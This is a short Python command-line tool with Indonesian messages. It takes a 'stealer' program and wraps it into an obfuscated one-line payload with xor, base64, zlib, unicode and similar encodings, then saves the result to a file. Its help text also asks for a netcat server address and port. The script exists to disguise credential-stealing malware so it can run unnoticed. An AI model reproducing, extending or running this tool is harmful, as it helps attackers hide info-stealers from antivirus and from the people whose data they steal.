import os
import sys
import glob
from io import StringIO

original_stdout = sys.stdout
sys.stdout = StringIO()
from PyOneLiner import OneLiner
sys.stdout = original_stdout

md = ["xor", "ascii85", "zlib", "base64", "binary", "base16", "base32", "base85", "unicode"]

def Oliner(mode, stealer):
    oneliner = OneLiner(stealer, type_="python")
    if mode == md[0]:
        oneliner.xor()
    elif mode == md[1]:
        oneliner.ascii85()
    elif mode == md[2]:
        oneliner.zlib()
    elif mode == md[3]:
        oneliner.base64()
    elif mode == md[4]:
        oneliner.binary()
    elif mode == md[5]:
        oneliner.base16()
    elif mode == md[6]:
        oneliner.base32()
    elif mode == md[7]:
        oneliner.base85()
    elif mode == md[8]:
        oneliner.unicode()
    return oneliner.done()

def gen(out, txt):
    with open(out, "w") as file:
        file.write(txt)
        
def delpayload():
    files = glob.glob("*payload*")
    for file in files:
        os.remove(file)
    return "\nSemua file payload berhasil dihapus\n"
        
def help():
    print(len(sys.argv))
    print("""Info:
mode - [ xor | ascii85 | zlib | base64 | binary | base16 | base32 | base85 | unicode ]
stealer - [program stealer]
output - [output oneliner]
server - [ip server netcat]
port - [port server netcat]

Penggunaan: python oliner.py [server] [port] [mode] [stealer] [output]\n""")
    
if len(sys.argv) < 7:
    if len(sys.argv) == 2 and (sys.argv[1] == "-h" or sys.argv[1] == "--help"):
        help()
    elif len(sys.argv) == 2 and (sys.argv[1] == "-d" or sys.argv[1] == "--delete"):
        print(delpayload())
    elif len(sys.argv) == 6:
        server = sys.argv[1]
        port = sys.argv[2]
        m = sys.argv[3]
        s = sys.argv[4]
        o = sys.argv[5]
        
        if m in md:
            text = Oliner(m, s)
            if os.path.exists(o):
                os.remove(o)
                print(f"\nFile {o} sudah ada dan berhasil dihapus\nMohon jalankan ulang script ini\n")
            
            gen(o, text)
            
            if os.path.exists(o):
                print(f"File {o} berhasil dibuat dengan mode {m}")
            else:
                print(f"File {o} gagal dibuat dengan mode {m}\n")
        else:
            print(f"\nMode {m} tidak ditemukan\nSilahkan gunakan mode yang tersedia\npython oliner.py -h\natau\npython oliner.py --help\n")
    else:
        help()
else:
    help()